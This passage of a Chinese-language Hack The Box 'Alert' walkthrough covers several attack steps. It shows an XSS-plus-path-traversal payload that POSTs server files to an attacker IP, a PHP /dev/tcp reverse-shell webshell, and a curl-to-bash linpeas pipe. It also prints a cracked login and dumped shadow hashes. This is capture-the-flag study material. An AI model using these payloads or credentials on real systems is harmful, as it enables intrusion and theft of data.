+<span class="line"><span>fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span></span>
+<span class="line"><span>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span></span>
+<span class="line"><span>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin</span></span>
+<span class="line"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span></span>
+<span class="line"><span>albert:x:1000:1000:albert:/home/albert:/bin/bash</span></span>
+<span class="line"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span></span>
+<span class="line"><span>david:x:1001:1002:,,,:/home/david:/bin/bash</span></span></code></pre>
+<p>尝试读取密钥无果，想到 Web 服务器是 Apache，于是尝试包含日志 Get Shell</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="markdown"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-light-font-weight:bold;--shiki-dark:#4BF3C8;--shiki-dark-font-weight:inherit"># Title1</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;script&gt;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">fetch("http://alert.htb/index.php?page=messages&amp;file=../../../../../../../../../../var/log/apache2/access.log").then(resp =&gt; resp.text()).then(data =&gt; fetch("http://10.10.16.32/read_apache", {method: "POST",body: data}));</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;/script&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">good</span></span></code></pre>
+<p><img alt="image-20241127214751176.png" loading="lazy" decoding="async" width="882" height="909" src="/_astro/image-20241127214751176.DOjAfYRG_Z1S52J1.webp" srcset=""></p>
+<p>但是读取不到这个文件，有可能是没权限，或者路径被修改了，想到前面目录扫描时发现的 uploads，猜测 markdown 就是保存在这个目录下</p>
+<p><img alt="image-20241127214653361.png" loading="lazy" decoding="async" width="1204" height="216" src="/_astro/image-20241127214653361.CBEEOkHK_bUrRM.webp" srcset=""></p>
+<p>果然，那么写一个 php 反弹 shell 试一下</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span># webshell</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&lt;?php system("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.32/443 0&gt;&amp;1'");?&gt;</span></span></code></pre>
+<p><img alt="image-20241127220107438.png" loading="lazy" decoding="async" width="795" height="285" src="/_astro/image-20241127220107438.C3PoEsEH_AmkiV.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="markdown"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-light-font-weight:bold;--shiki-dark:#4BF3C8;--shiki-dark-font-weight:inherit"># Title1</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;script&gt;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">fetch("http://alert.htb/index.php?page=messages&amp;file=../uploads/6747216b62e027.33800409.md").then(resp =&gt; resp.text()).then(data =&gt; fetch("http://10.10.16.32/read_apache", {method: "POST",body: data}));</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;/script&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">good</span></span></code></pre>
+<p><img alt="image-20241127220154980.png" loading="lazy" decoding="async" width="1161" height="872" src="/_astro/image-20241127220154980.Bh0CapNI_ZeQ6Dh.webp" srcset=""></p>
+<p>可以看到并没有执行，那可能是仅仅读取了文件，这样的话只能靠读取本地文件来找敏感信息了</p>
+<p>首先看一下 apache 的配置文件，默认路径是 <code>/etc/apache2/apache2.conf</code> 以及域名反代的配置文件 <code>/etc/apache/sites-available/000-default.conf</code> 读取后在 <code>000-default.conf</code> 中发现</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>&lt;VirtualHost *:80&gt;</span></span>
+<span class="line"><span>    ServerName alert.htb</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    DocumentRoot /var/www/alert.htb</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    &lt;Directory /var/www/alert.htb&gt;</span></span>
+<span class="line"><span>        Options FollowSymLinks MultiViews</span></span>
+<span class="line"><span>        AllowOverride All</span></span>
+<span class="line"><span>    &lt;/Directory&gt;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    RewriteEngine On</span></span>
+<span class="line"><span>    RewriteCond %{HTTP_HOST} !^alert\.htb$</span></span>
+<span class="line"><span>    RewriteCond %{HTTP_HOST} !^$</span></span>
+<span class="line"><span>    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    ErrorLog ${APACHE_LOG_DIR}/error.log</span></span>
+<span class="line"><span>    CustomLog ${APACHE_LOG_DIR}/access.log combined</span></span>
+<span class="line"><span>&lt;/VirtualHost&gt;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&lt;VirtualHost *:80&gt;</span></span>
+<span class="line"><span>    ServerName statistics.alert.htb</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    DocumentRoot /var/www/statistics.alert.htb</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    &lt;Directory /var/www/statistics.alert.htb&gt;</span></span>
+<span class="line"><span>        Options FollowSymLinks MultiViews</span></span>
+<span class="line"><span>        AllowOverride All</span></span>
+<span class="line"><span>    &lt;/Directory&gt;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    &lt;Directory /var/www/statistics.alert.htb&gt;</span></span>
+<span class="line"><span>        Options Indexes FollowSymLinks MultiViews</span></span>
+<span class="line"><span>        AllowOverride All</span></span>
+<span class="line"><span>        AuthType Basic</span></span>
+<span class="line"><span>        AuthName "Restricted Area"</span></span>
+<span class="line"><span>        AuthUserFile /var/www/statistics.alert.htb/.htpasswd</span></span>
+<span class="line"><span>        Require valid-user</span></span>
+<span class="line"><span>    &lt;/Directory&gt;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    ErrorLog ${APACHE_LOG_DIR}/error.log</span></span>
+<span class="line"><span>    CustomLog ${APACHE_LOG_DIR}/access.log combined</span></span>
+<span class="line"><span>&lt;/VirtualHost&gt;</span></span></code></pre>
+<p><code>/var/www/statistics.alert.htb/.htpasswd</code> 这个文件，添加域名查看这个 VHost</p>
+<p><img alt="image-20241127220906784.png" loading="lazy" decoding="async" width="980" height="407" src="/_astro/image-20241127220906784.Pdoh8jvz_O5YB5.webp" srcset=""></p>
+<p>需要认证</p>
+<p><img alt="image-20241127220857771.png" loading="lazy" decoding="async" width="929" height="337" src="/_astro/image-20241127220857771.BfJqfpxi_13cy2r.webp" srcset=""></p>
+<p>文件也无法访问，那么还是得通过文件读取来查看</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="markdown"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-light-font-weight:bold;--shiki-dark:#4BF3C8;--shiki-dark-font-weight:inherit"># Title1</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;script&gt;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">fetch("http://alert.htb/index.php?page=messages&amp;file=../../../../../../../../../var/www/statistics.alert.htb/.htpasswd").then(resp =&gt; resp.text()).then(data =&gt; fetch("http://10.10.16.32/read_apache", {method: "POST",body: data}));</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;/script&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">good</span></span></code></pre>
+<p><img alt="image-20241127221024488.png" loading="lazy" decoding="async" width="958" height="1034" src="/_astro/image-20241127221024488.fsevVhu1_1i5xmm.webp" srcset=""></p>
+<p>发现 albert 的密码 Hash，Hashcat 爆破一下</p>
+<p><img alt="image-20241127221220637.png" loading="lazy" decoding="async" width="1062" height="515" src="/_astro/image-20241127221220637.BZQMtSm8_Z20HN56.webp" srcset=""></p>
+<p><img alt="image-20241127221237221.png" loading="lazy" decoding="async" width="1024" height="549" src="/_astro/image-20241127221237221.BjqJTTJQ_BQKAp.webp" srcset=""></p>
+<p>登录 <code>albert:manchesterunited</code></p>
+<p><img alt="image-20241127221329831.png" loading="lazy" decoding="async" width="906" height="223" src="/_astro/image-20241127221329831.D3_GjWwy_1jh4Jd.webp" srcset=""></p>
+<h3 id="local-enum">Local Enum</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>sudo nc -lvnp 443 | tee linpeas.log</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>curl http://10.10.16.32/linpeas.sh | bash &gt; /dev/tcp/10.10.16.32/443</span></span></code></pre>
+<p><img alt="image-20241127221938343.png" loading="lazy" decoding="async" width="2158" height="1179" src="/_astro/image-20241127221938343.DMn3nmXY_QNUkc.webp" srcset=""></p>
+<h2 id="shell-as-root">Shell as Root</h2>
+<p><img alt="image-20241127223801426.png" loading="lazy" decoding="async" width="2319" height="679" src="/_astro/image-20241127223801426.DLSlCc1n_Z1eR2IS.webp" srcset=""></p>
+<p>进程发现一个以 Root 身份运行 PHP Web 服务，加载了 <code>/opt/website-monitor/config</code> 目录</p>
+<p><img alt="image-20241127223917873.png" loading="lazy" decoding="async" width="1442" height="741" src="/_astro/image-20241127223917873.fGo4kpjR_VMfvu.webp" srcset=""></p>
+<p>??? 不带 David 玩是吧。</p>
+<h2 id="more">More</h2>
+<p>Easy 机器就是 Easy 没什么好说的，这个 Root 一股非预期的感觉。</p>
+<h3 id="dump-hash">Dump Hash</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>root:$6$gSjyQo8nJFMsegNG$jRRGms4KAq1FGTXwBJl236Ui5OKRtmaM3k8nkXuvduPXnhhaT/ZCYHHYO3GxhUAik1NaFYlBGaQZBrzQHgOhc/:19791:0:99999:7:::</span></span>
+<span class="line"><span>daemon:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>bin:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>sys:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>sync:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>games:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>man:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>lp:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>mail:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>news:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>uucp:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>proxy:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>www-data:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>backup:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>list:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>irc:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>gnats:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>nobody:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>systemd-network:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>systemd-resolve:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>systemd-timesync:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>messagebus:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>syslog:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>_apt:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>tss:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>uuidd:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>tcpdump:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>landscape:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>pollinate:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>fwupd-refresh:*:19430:0:99999:7:::</span></span>
+<span class="line"><span>usbmux:*:19790:0:99999:7:::</span></span>
+<span class="line"><span>sshd:*:19790:0:99999:7:::</span></span>
+<span class="line"><span>systemd-coredump:!!:19790::::::</span></span>
+<span class="line"><span>albert:$6$ITP6P5Et1oVKsi7t$kEwgQPb4LUVcYb9MDHklHWKwDPvE6l7TGBUZogMvPoHUDt2IZ0ONlWODbsiTFdwd7SkYUNHGA0QS.Bnd6/tsp0:19822:0:99999:7:::</span></span>
+<span class="line"><span>lxd:!:19790::::::</span></span>
+<span class="line"><span>david:$6$oYlviwCQ3SMghmp.$95V3x9QjaD5GU8yoFsb8ufq9GrJ7PtcMAilTYtiNN2RZsVG0qgiWXUdlDURqdE84Nk2T11F4BpJXz3FbEK3bC1:20008:0:99999:7:::</span></span></code></pre>
+</div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer></body></html>
